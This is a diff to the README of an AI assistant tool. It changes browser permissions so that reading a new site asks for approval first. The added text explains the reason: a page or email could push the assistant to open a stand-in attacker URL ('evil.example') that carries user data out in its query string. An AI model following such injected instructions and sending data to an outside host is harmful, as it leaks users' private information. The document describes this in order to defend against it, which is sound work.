@@ -20,7 +20,8 @@ local models via Ollama.
 
 - **Permissions you can read.** Every tool maps to a capability
   (`email.read`, `email.send`, `calendar.write`, ...) with a risk level.
-  Reads are allowed by default; writes and irreversible actions ask first.
+  Reads are allowed by default (except browsing a new site, which asks);
+  writes and irreversible actions ask first.
   Change any of it per capability: `allow`, `ask` or `deny`.
 - **Approvals anywhere:** inline in `bosun chat`, in the web UI, or with
   Approve/Deny buttons on Telegram.
@@ -177,7 +178,9 @@ Every command has `--help`.
 
 Every tool has a capability (e.g. `websearch.fetch`) and a risk level. Unless
 you set a rule, the risk default from `policy.defaults` applies (read: allow,
-write: ask, destructive: ask). "ask" pauses the tool call until you answer;
+write: ask, destructive: ask), except where an integration declares its own
+default for a capability (the browser's `browser.read` asks; `bosun tools`
+shows what applies to each tool). "ask" pauses the tool call until you answer;
 `bosun chat` prompts inline, and `bosun approvals list` /
 `bosun approvals <id> approve|deny` work from any terminal.
 
@@ -550,16 +553,30 @@ button; `bosun browser stop` does the same.
 
 | Tool | Capability | Risk | Scoped to the site |
 |---|---|---|---|
-| `browser.open`, `browser.read`, `browser.find`, `browser.screenshot` | `browser.read` | read (allowed by default) | `open`: its URL's site |
+| `browser.open`, `browser.read`, `browser.find`, `browser.screenshot` | `browser.read` | read (asks until you allow the site) | `open`: its URL's site; the others: the current page's site |
 | `browser.click`, `browser.type`, `browser.select`, `browser.scroll`, `browser.back` | `browser.act` | write (asks by default) | yes |
 | `browser.login` | `browser.login` | write | yes |
 | `browser.submit` | `browser.submit` | destructive (asks) | yes |
 
-**Granting a site.** Acting on pages asks by default. The first time the
-assistant clicks around a site you trust, answer **Approve and always allow on
-opentable.com** and later clicks, typing and scrolling there run without
-asking; other sites still ask. You can also set it up front:
-`bosun policy set browser.act allow --scope opentable.com`.
+**Granting a site.** Even reading asks the first time on each site, because
+a visit can carry data out in its URL (a page the assistant read, or an
+email, could try to get it to open `https://evil.example/?q=<your data>`).
+The first `browser.open` of a site asks, scoped to that site: answer
+**Approve and always allow on opentable.com** (web UI, Telegram, `a` at the
+`[y]es / [a]lways on opentable.com / [N]o` prompt of `bosun chat`, or
+`bosun approvals <id> approve --always`) and from then on opening, reading,
+finding and screenshotting pages there run without asking; any other site
+asks again. Up front: `bosun policy set browser.read allow --scope opentable.com`
+(or `bosun policy set browser.read allow` to let it read anywhere).
+
+A granted site is still gated beyond reading:
+
+- **Acting** (click, type, select, scroll, back) is `browser.act`, which asks
+  on every site until you also allow it there: answer "always allow" on the
+  first click, or `bosun policy set browser.act allow --scope opentable.com`.
+- **Submitting** (`browser.submit`) asks every time, with a screenshot (below).
+- **Sensitive sites** ask for everything, reading included, whatever your
+  rules say.
 
 **What always asks.** Anything that changes your account goes through
 `browser.submit`: `browser.click` refuses submit buttons and anything labelled
